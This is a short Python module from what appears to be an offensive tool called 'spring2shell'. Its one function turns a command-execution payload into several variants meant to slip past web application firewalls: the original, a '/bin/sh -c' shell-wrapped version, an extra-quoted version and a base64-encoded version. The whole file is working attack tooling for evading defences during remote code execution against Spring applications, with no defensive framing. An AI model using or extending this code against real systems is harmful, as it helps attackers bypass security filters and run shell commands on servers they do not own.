"""
Payload mutation utilities for spring2shell.

Provides:
- generate_payload_variants(): expand a single payload into multiple encoding variants
"""

from __future__ import annotations

import base64


def generate_payload_variants(payload: str) -> list[str]:
    """Produce encoding variants of *payload* for WAF bypass attempts.

    Variants produced:
    1. Original payload (unchanged).
    2. Shell-wrapped exec variant (``/bin/sh -c`` prefix).
    3. Extra-quoted variant.
    4. Base64-encoded payload.

    Args:
        payload: Raw payload string.

    Returns:
        List of payload variants (may contain duplicates if substitutions
        don't match — callers should deduplicate if needed).
    """
    variants = [payload]
    variants.append(payload.replace('exec(\\"', 'exec(\\"/bin/sh -c '))
    variants.append(payload.replace('\\"}\\"}', '\\"\\"}\\"}'))
    variants.append(base64.b64encode(payload.encode()).decode())
    return variants
